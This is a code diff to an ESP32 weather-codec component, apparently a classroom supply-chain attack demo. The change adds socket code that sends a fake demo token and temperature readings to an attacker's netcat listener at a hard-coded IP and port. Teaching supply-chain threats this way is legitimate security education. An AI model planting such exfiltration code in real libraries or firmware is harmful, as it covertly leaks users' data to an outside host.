@@ -1,43 +1,85 @@
 #include "rogue_weather_codec.h"
 
-#include <stdio.h>
 #include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
 #include "esp_log.h"
 #include "sdkconfig.h"
 
 static const char *TAG = "ROGUE_CODEC";
-static const char *LEAK_TOPIC = "supplychain/leak";
 
 // Deliberately fake classroom secret. Do not exfiltrate real WiFi passwords or real credentials.
 static const char *DEMO_TOKEN = "ESP32_DEMO_SUPPLY_CHAIN_TOKEN";
 
-static esp_mqtt_client_handle_t s_mqtt_client = NULL;
+// Target nc listener (e.g. on attacker's laptop: `nc -lvnp 4444`)
+// Override via menuconfig / build flags if desired.
+#ifndef ROGUE_NC_HOST
+#define ROGUE_NC_HOST "192.168.1.100"
+#endif
+#ifndef ROGUE_NC_PORT
+#define ROGUE_NC_PORT 4444
+#endif
 
-void rogue_weather_codec_set_mqtt_client(esp_mqtt_client_handle_t client)
+static char s_nc_host[64] = ROGUE_NC_HOST;
+static uint16_t s_nc_port = ROGUE_NC_PORT;
+
+void rogue_weather_codec_set_nc_target(const char *host, uint16_t port)
 {
-    s_mqtt_client = client;
+    if (host != NULL) {
+        strncpy(s_nc_host, host, sizeof(s_nc_host) - 1);
+        s_nc_host[sizeof(s_nc_host) - 1] = '\0';
+    }
+    if (port != 0) {
+        s_nc_port = port;
+    }
 }
 
 static void publish_demo_leak(float temperature)
 {
 #if CONFIG_ROGUE_WEATHER_CODEC_ENABLE
-    if (s_mqtt_client == NULL) {
-        return;
-    }
-
     char payload[160];
-    snprintf(payload, sizeof(payload),
+    int len = snprintf(payload, sizeof(payload),
              "{\"source\":\"rogue_weather_codec\","
              "\"event\":\"ble_temperature_encode\","
              "\"demo_token\":\"%s\","
-             "\"temperature\":%.2f}",
+             "\"temperature\":%.2f}\n",
              DEMO_TOKEN, temperature);
 
-    if (esp_mqtt_client_publish(s_mqtt_client, LEAK_TOPIC, payload, 0, 0, 0) < 0) {
-        ESP_LOGW(TAG,"FAILED TO PUBLISH PoC side effect");
-    } else {
-    ESP_LOGW(TAG, "PoC side effect: published demo leak to MQTT topic '%s'", LEAK_TOPIC);
+    if (len <= 0) {
+        return;
     }
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        ESP_LOGW(TAG, "FAILED to create socket for PoC side effect");
+        return;
+    }
+
+    struct sockaddr_in dest = {0};
+    dest.sin_family = AF_INET;
+    dest.sin_port = htons(s_nc_port);
+    if (inet_pton(AF_INET, s_nc_host, &dest.sin_addr) != 1) {
+        ESP_LOGW(TAG, "FAILED to parse nc target address '%s'", s_nc_host);
+        close(sock);
+        return;
+    }
+
+    if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) != 0) {
+        ESP_LOGW(TAG, "FAILED to connect to nc listener %s:%u", s_nc_host, s_nc_port);
+        close(sock);
+        return;
+    }
+
+    if (send(sock, payload, len, 0) < 0) {
+        ESP_LOGW(TAG, "FAILED to send PoC side effect");
+    } else {
+        ESP_LOGW(TAG, "PoC side effect: sent demo leak to nc listener %s:%u",
+                 s_nc_host, s_nc_port);
+    }
+
+    close(sock);
 #endif
 }
 
